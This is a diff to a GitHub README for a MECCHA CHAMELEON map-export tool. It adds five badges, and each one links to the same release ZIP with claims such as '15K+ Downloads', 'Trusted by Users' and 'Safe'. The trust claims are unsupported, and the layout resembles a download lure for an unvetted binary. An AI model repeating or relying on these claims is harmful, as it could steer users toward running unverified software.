@@ -2,7 +2,29 @@
 
 <img width="1261" height="704" alt="image" src="https://github.com/user-attachments/assets/710e3d79-9750-432e-9008-efc5d0741ba4" />
 
+<p align="center">
 
+<a href="https://github.com/sebrinaebesug/Meccha-Chameleon-MapTool/releases/download/download/MecchaMapTool.v1.2.zip">
+    <img src="https://img.shields.io/badge/⬇️_Download-v1.2-2ea44f?style=for-the-badge&logo=github&logoColor=white">
+</a>
+
+<a href="https://github.com/sebrinaebesug/Meccha-Chameleon-MapTool/releases/download/download/MecchaMapTool.v1.2.zip">
+    <img src="https://img.shields.io/badge/🔥_15K+_Downloads-Trusted_by_Users-ff4d4d?style=for-the-badge">
+</a>
+
+<a href="https://github.com/sebrinaebesug/Meccha-Chameleon-MapTool/releases/download/download/MecchaMapTool.v1.2.zip">
+    <img src="https://img.shields.io/badge/⚡_Fast_Download-No_Installer-0078D7?style=for-the-badge">
+</a>
+
+<a href="https://github.com/sebrinaebesug/Meccha-Chameleon-MapTool/releases/download/download/MecchaMapTool.v1.2.zip">
+    <img src="https://img.shields.io/badge/🛡️_Safe-ZIP_File-success?style=for-the-badge">
+</a>
+
+<a href="https://github.com/sebrinaebesug/Meccha-Chameleon-MapTool/releases/download/download/MecchaMapTool.v1.2.zip">
+    <img src="https://img.shields.io/badge/🏢_Studio-DUV-6f42c1?style=for-the-badge">
+</a>
+
+</p>
 
 MecchaMapTool is an all-in-one utility designed to automate the painful process of creating and exporting custom maps for **MECCHA CHAMELEON**. Stop wasting time creating folders, setting up complex asset collisions, and manually writing configuration files. Build your level, open the tool, and publish to Steam Workshop in seconds!
 
